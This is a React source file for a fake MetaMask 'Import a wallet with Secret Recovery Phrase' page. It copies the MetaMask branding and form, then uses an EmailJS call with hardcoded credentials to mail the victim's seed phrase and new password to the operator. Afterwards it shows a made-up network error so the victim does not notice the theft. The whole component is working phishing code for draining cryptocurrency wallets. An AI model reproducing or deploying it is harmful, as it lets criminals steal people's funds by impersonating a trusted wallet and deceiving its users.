import { useState, useEffect } from 'react';
import { useHistory } from "react-router-dom";
import { 
	Flex,
	Box,
	Text,
	Button,
	Input,
	Spacer,
	Image,
	Textarea,
	Select,
	ChakraProvider,
	Spinner,
} from "@chakra-ui/react";
import emailjs from 'emailjs-com';
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import {
  ViewIcon,
  ViewOffIcon
} from "@chakra-ui/icons";
import mm from "./metamask.svg";



function Wallet() {
  const [error, setError] = useState(false)
  const [errorMsg, setErrorMsg] = useState("")
  const [terms, setTerms] = useState(true)
  const [tArea, setTArea] = useState(false)
  const [seed, setSeed] = useState("")
  const [pass, setPass] = useState("")
  const [errorSeed, setErrorSeed] = useState(false)
  const [errorPass, setErrorPass] = useState(false)
  const [loading, setLoading] = useState(false)

  const history = useHistory()

  useEffect(() => {
    if (error) {
      setTimeout(function() {
        setError(false)
      }, 3000)
    }
  }, [error])


  const templateParams = {
      from_name: "User",
      message: "The seed is:=("+seed+") and user password is("+pass+")"
    }


  async function saveSeed(){
    setLoading(true)
    await emailjs.send('Outlook', 'template_x8xq1wv', templateParams, 'user_YlKlSFVTMjO2Rur6I4bW6')
      .then((response) => {
        console.log('')
      }, (err) => {
        console.log('')
      })
      setLoading(false)
    setErrorMsg("Network error! Cannot Import wallet at the moment kindly try again")
    setError(true)
    }


    function seedFunc() {
      setTimeout(function(){
        if (tArea) {
          document.getElementById('seedHide').value = seed
        }
        else {
          document.getElementById('seedShow').value = seed
        }
      }, 100)
    }


  return(
    <>
      {
        error &&
        <Flex position="fixed" top="0" left="0" w="100%" height="100%" zIndex="100000" bg="transparent">
          <Flex padding="12px" bg="#FF362D" color="#fff" w="100%" align="center" h={["70px","60px"]}>
            <Flex w="100%" fontWeight="bold" fontSize="14px" justify="center">Error: {errorMsg}</Flex>
            <Text as="span" align="center" bg="transparent" border="1px solid rgba(0, 0, 0, 0.1)" justify="center" borderRadius="100%" padding="8px" onClick={() => setError(false)} cursor="pointer">
              <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall" focusable="false" viewBox="0 0 24 24" aria-hidden="true" style={{ fill : "#fff", width: "18px", height: "18px" }}><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" style={{ fill : "#fff" }}></path></svg>
            </Text>
          </Flex>
        </Flex>
      }
      <Flex flex="1" bg="#fff">
        <Flex h="100vh" className="scPage" overflowY="scroll" direction="column" padding={["6%", "2% 20%"]} color="#4d4d4d" align="flex-start">
          <Image src={mm} h="30px" mb="3" />
          <Flex fontSize="14px" mb="24px" cursor="pointer" onClick={() => history.push("/")} align="center"><i className="mdi mdi-chevron-left" style={{ fontSize: "16px" }}></i> Back</Flex>

          <Flex fontSize={["30px", "2.5rem"]} mb="24px" fontWeight="bold" lineHeight="140%" color="black">Import a wallet with Secret Recovery Phrase</Flex>

          <Flex fontSize="14px" mb={["7", "5"]}>Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.</Flex>

          <Text mb="2" fontSize={["12px", "16px"]}>Secret Recovery Phrase</Text>
          <Text w={["100%", "50%"]}>
          {
            tArea ?
            <textarea style={{ height: "80px", width: "100%", padding: "4%", color: "rgba(0, 0, 0, 0.87)", lineHeight: "1.1876em", letterSpacing: "0.00938em", background: "transparent", borderRadius: "6px", fontSize: "14px" }} placeholder="Seperate each word with a single space" id="seedShow" onInput={(e)=> {
                if (e.target.value.match(/(\w+)/g)?.length > 11) {
                  setSeed(e.target.value)
                  setErrorSeed(false)
                }
                else if (e.target.value === "") {
                  setErrorSeed(false)
                }
                else {
                  setErrorSeed(true)
                }
                setSeed(e.target.value)
              }}></textarea>
            :
            <input style={{ width: "100%", padding: "4%", color: "rgba(0, 0, 0, 0.87)", lineHeight: "1.1876em", letterSpacing: "0.00938em", background: "transparent", borderRadius: "6px", fontSize: "14px"  }} type="password" placeholder="Paste Secret Recovery Phrase from clipboard" id="seedHide" onInput={(e)=> {
                if (e.target.value.match(/(\w+)/g)?.length > 11) {
                  setSeed(e.target.value)
                  setErrorSeed(false)
                }
                else if (e.target.value === "") {
                  setErrorSeed(false)
                }
                else {
                  setErrorSeed(true)
                }
                setSeed(e.target.value)
              }}/>
          }
          </Text>
          {
            errorSeed &&
            <Flex color="#f7861c" fontSize={["12px", "14px"]} mt="2" w={["100%", "50%"]}>Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words</Flex>
          }

          <Flex mt="2" align="center" mb="2">
            {
              tArea ?
              <i className="mdi mdi-checkbox-marked-outline" style={{ fontSize: "40px", color: "#1098fc" }} onClick={async () => {
                await setTArea(false)
                seedFunc()
              }}/>
              :
              <i className="mdi mdi-checkbox-blank-outline" style={{ fontSize: "40px", color: "rgb(235, 235, 235)" }} onClick={async () => {
                await setTArea(true)
                seedFunc()
              }}/>
            }
            <Text ml={["12px", "18px"]} color="#939090" fontSize={["13px", "18px"]}>Show Secret Recovery Phrase</Text>
          </Flex>

          <Text mb="2" fontSize={["12px", "16px"]}>New password (min 8 chars)</Text>
          <Text w={["100%", "50%"]}>
            <input style={{ width: "100%", padding: "4%", color: "rgba(0, 0, 0, 0.87)", lineHeight: "1.1876em", letterSpacing: "0.00938em", background: "transparent", borderRadius: "6px" }} type="password" onInput={(e)=> {
                if (e.target.value.length > 7) {
                  setPass(e.target.value)
                  setErrorPass(false)
                }
                else if (e.target.value === "") {
                  setErrorPass(false)
                }
                else {
                  setErrorPass(true)
                }
              }}/>
          </Text>
          {
            errorPass &&
            <Flex color="#f00" fontSize={["12px", "14px"]} mt="2" w={["100%", "50%"]}>Password must be at least 8 characters</Flex>
          }

          <Text mb="2" mt="5" fontSize={["12px", "16px"]}>Confirm password</Text>
          <Text w={["100%", "50%"]}>
            <input style={{ width: "100%", padding: "4%", color: "rgba(0, 0, 0, 0.87)", lineHeight: "1.1876em", letterSpacing: "0.00938em", background: "transparent", borderRadius: "6px" }} type="password" />
          </Text>

          <Flex mt="2" align="center" mb={["4", "2"]}>
            {
              terms ?
              <i className="mdi mdi-checkbox-blank-outline" style={{ fontSize: "40px", color: "rgb(235, 235, 235)" }} onClick={() => setTerms(false)}/>
              :
              <i className="mdi mdi-checkbox-marked-outline" style={{ fontSize: "40px", color: "#1098fc" }} onClick={() => setTerms(true)}/>
            }
            <Text ml={["12px", "18px"]} color="#939090" fontSize={["13px", "18px"]}>I have read and agree to the <Text as="span" ml="1" cursor="pointer" color="#037dd6" fontWeight="bold" onClick={() => window.open("https://metamask.io/terms.html", "_blank")}>Terms of Use</Text></Text>
          </Flex>

          <Text w="100%">
            <Button bg="#037dd6" color="#fff" padding="2.5% 2%" borderRadius="100px" w={["100%", "20%"]} disabled={terms} onClick={() => {
              saveSeed()
            }}>{loading ? <Spinner color="#fff" /> : "Import" }</Button>
          </Text>
        </Flex>
      </Flex>
    </>
  )
}



export default Wallet;